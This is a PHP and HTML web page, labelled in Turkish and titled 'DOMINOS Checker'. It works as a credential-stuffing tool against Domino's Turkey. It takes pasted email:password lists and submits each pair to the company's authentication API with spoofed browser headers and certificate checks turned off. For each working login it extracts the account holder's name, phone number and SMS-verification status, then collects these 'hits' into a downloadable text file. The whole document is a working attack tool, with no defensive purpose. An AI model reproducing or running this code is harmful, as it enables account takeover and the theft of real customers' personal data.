<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

if (isset($_GET['action']) && $_GET['action'] == 'check') {
    header('Content-Type: application/json');
    error_reporting(0);
    
    $user = trim($_POST['user'] ?? '');
    $pass = trim($_POST['pass'] ?? '');

    function lr_parse($string, $left, $right) {
        $data = explode($left, $string);
        if (isset($data[1])) {
            $data = explode($right, $data[1]);
            return trim($data[0]);
        }
        return null;
    }

    $payload = json_encode([
        'email' => $user,
        'password' => $pass,
        'typeCode' => 1,
        'channelCode' => 'ANDROID',
        'isSure' => true,
        'route' => '/',
        'walletRegister' => false
    ]);

    $headers = [
        "Content-Type: application/json",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma: no-cache",
        "Accept: */*"
    ];

    $ch = curl_init("https://frontend.dominos.com.tr/api/authentication");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode == 200 || strpos($response, '{"id":') !== false) {
        
        $name = lr_parse($response, '"name":"', '",') ?: 'Bilinmiyor';
        $surname = lr_parse($response, '"surname":"', '",') ?: '';
        $phone = lr_parse($response, '"mobilePhone":"', '",');
        
        if (!$phone) {
            $phone = lr_parse($response, 'mobilePhone":"', '",') ?: 'Bilinmiyor';
        }
        
        $verifyRaw = lr_parse($response, '"isPhoneVerify":', ',');
        if ($verifyRaw === null) {
            $verifyRaw = lr_parse($response, '"isPhoneVerify":', '}');
        }
        
        $isVerify = (strpos(strtolower((string)$verifyRaw), 'true') !== false) ? '✓' : '×';
        $detaylar = "İsim: " . trim("$name $surname") . " | Tel: $phone | SMS Onay: $isVerify";

        echo json_encode([
            'status' => 'success',
            'user' => $user, 
            'pass' => $pass,
            'sayi' => $isVerify,
            'arabalar' => $detaylar
        ]);
    } else {
        echo json_encode(['status' => 'fail', 'user' => $user, 'pass' => $pass]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DOMINOS EXPORT EDITION | CPM STYLE</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { background-color: #030408; color: #e2e8f0; font-family: 'Inter', sans-serif; overflow-x: hidden; }
        .neon-blue { box-shadow: 0 0 15px rgba(37, 99, 235, 0.2); border: 1px solid rgba(37, 99, 235, 0.4); }
        .neon-red { box-shadow: 0 0 15px rgba(220, 38, 38, 0.2); border: 1px solid rgba(220, 38, 38, 0.4); }
        .neon-green { box-shadow: 0 0 15px rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.3); }
        .main-card { background: rgba(12, 15, 22, 0.9); backdrop-filter: blur(10px); border-radius: 16px; transition: all 0.3s ease; border: 1px solid rgba(255,255,255,0.05); }
        .input-area { background: #06080d; border: 1px solid #1e3a8a; border-radius: 12px; color: #60a5fa; font-family: 'Consolas', monospace; width: 100%; outline: none; }
        .input-area:focus { border-color: #3b82f6; }
        .hit-box { background: linear-gradient(145deg, #0f172a, #06080d); border-left: 4px solid #10b981; border-radius: 12px; }
    </style>
</head>
<body class="p-4 md:p-8">
    <div class="max-w-[1500px] mx-auto flex justify-between items-center mb-8">
        <div class="flex items-center gap-3">
            <div class="w-11 h-11 bg-red-600 rounded-lg flex items-center justify-center shadow-lg shadow-red-600/30">
                <i class="fa-solid fa-pizza-slice text-white text-xl"></i>
            </div>
            <h1 class="text-2xl font-black tracking-tighter italic" style="font-family: 'Syncopate', sans-serif;">DOMINOS<span class="text-blue-500">Checker</span></h1>
        </div>
        <a href="index.php" class="bg-white/5 hover:bg-red-600 border border-white/10 px-5 py-2.5 rounded-xl text-xs font-black uppercase tracking-widest transition-all italic">Geri Çıkış</a>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-1 md:grid-cols-3 gap-5 mb-8">
        <div class="main-card p-6 neon-blue">
            <span class="text-blue-400 text-[10px] font-black uppercase mb-1.5 block">Kalan</span>
            <div class="text-4xl font-black" id="kalan_val">BİTTİ</div>
        </div>
        <div class="main-card p-6 neon-green">
            <span class="text-green-500 text-[10px] font-black uppercase mb-1.5 block">Hit</span>
            <div class="text-4xl font-black text-green-500" id="hit_count">0</div>
        </div>
        <div class="main-card p-6 neon-red">
            <span class="text-red-500 text-[10px] font-black uppercase mb-1.5 block">Fail</span>
            <div class="text-4xl font-black text-red-500" id="fail_count">0</div>
        </div>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-1 lg:grid-cols-12 gap-8">
        <div class="lg:col-span-4 space-y-5">
            <div class="main-card p-6 neon-blue">
                <textarea id="accs" class="input-area h-[220px] p-4 text-xs" placeholder="email:şifre"></textarea>
                <button id="btn" onclick="startCheck()" class="w-full mt-5 py-4 bg-blue-600 hover:bg-blue-500 rounded-xl text-white font-black uppercase tracking-widest text-sm shadow-md active:scale-95 transition-all">Taramayı Başlat</button>
            </div>
            <div class="main-card p-5 h-32 overflow-y-auto bg-black/50 font-mono text-[10px] text-blue-200" id="mini_log">Sistem Hazır.</div>
        </div>

        <div class="lg:col-span-8">
            <div class="flex justify-between items-end mb-4">
                <h2 class="text-xl font-black uppercase italic text-gray-200">Canlı Sonuçlar</h2>
                <button onclick="downloadHits()" class="bg-green-600 hover:bg-green-500 text-white px-6 py-3 rounded-xl text-xs font-black uppercase tracking-widest transition-all">TXT İndir</button>
            </div>
            <div class="main-card p-6 h-[660px] overflow-y-auto space-y-5 neon-blue" id="hitLog">
                <div class="flex flex-col items-center justify-center h-full opacity-10 italic font-black uppercase">Veri Bekleniyor...</div>
            </div>
        </div>
    </div>

    <script>
        let running = false; let hits = 0; let fails = 0; let hitResults = [];
        
        async function startCheck() {
            const list = document.getElementById('accs').value.split('\n').filter(l => l.includes(':'));
            if(!list.length) return alert("Liste boş!");
            if(running) { running = false; return; }
            
            running = true;
            const btn = document.getElementById('btn');
            btn.innerText = "DURDUR"; 
            btn.classList.replace('bg-blue-600', 'bg-red-600');
            btn.classList.replace('hover:bg-blue-500', 'hover:bg-red-500');
            document.getElementById('kalan_val').innerText = list.length;
            
            for(let line of list) {
                if(!running) break;
                const [u, p] = line.trim().split(':');
                try {
                    const fd = new FormData(); 
                    fd.append('user', u); 
                    fd.append('pass', p);
                    
                    const resp = await fetch('?action=check', { method: 'POST', body: fd });
                    const res = await resp.json();
                    const log = document.getElementById('mini_log');
                    
                    if(res.status === 'success') {
                        hits++; 
                        document.getElementById('hit_count').innerText = hits;
                        hitResults.push(`${res.user}:${res.pass} | Onay: ${res.sayi} | ${res.arabalar}`);
                        addHit(res);
                        log.innerHTML = `<div style="color:#10b981">[HIT] ${u}</div>` + log.innerHTML;
                    } else { 
                        fails++; 
                        document.getElementById('fail_count').innerText = fails; 
                        log.innerHTML = `<div style="color:#ef4444">[FAIL] ${u}</div>` + log.innerHTML;
                    }
                } catch(e) { }
                document.getElementById('kalan_val').innerText = parseInt(document.getElementById('kalan_val').innerText) - 1;
            }
            running = false; 
            btn.innerText = "TARAMAYI BAŞLAT"; 
            btn.classList.replace('bg-red-600', 'bg-blue-600');
            btn.classList.replace('hover:bg-red-500', 'hover:bg-blue-500');
            document.getElementById('kalan_val').innerText = "BİTTİ";
        }

        function addHit(res) {
            const log = document.getElementById('hitLog');
            if(hits === 1) log.innerHTML = '';
            const div = document.createElement('div');
            div.className = 'hit-box p-5 mb-4 border-l-4 border-green-500 shadow-lg';
            
            const onayRengi = res.sayi === '✓' ? 'text-green-500' : 'text-orange-500';
            
            div.innerHTML = `
                <div class="flex justify-between items-center mb-2">
                    <span class="text-sm font-bold text-blue-400"><i class="fa-solid fa-envelope text-xs mr-1"></i> ${res.user}:${res.pass}</span>
                    <span class="text-2xl font-black ${onayRengi}"><span class="text-xs text-gray-500 mr-1">ONAY</span>${res.sayi}</span>
                </div>
                <div class="text-[11px] font-mono text-gray-400 italic bg-black/40 p-2 rounded border border-white/5">${res.arabalar}</div>
            `;
            log.prepend(div);
        }

        function downloadHits() {
            if (!hitResults.length) return;
            const blob = new Blob([hitResults.join('\n')], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url; 
            a.download = `Dominos_Hits_${new Date().getTime()}.txt`; 
            a.click();
        }
    </script>
</body>
</html>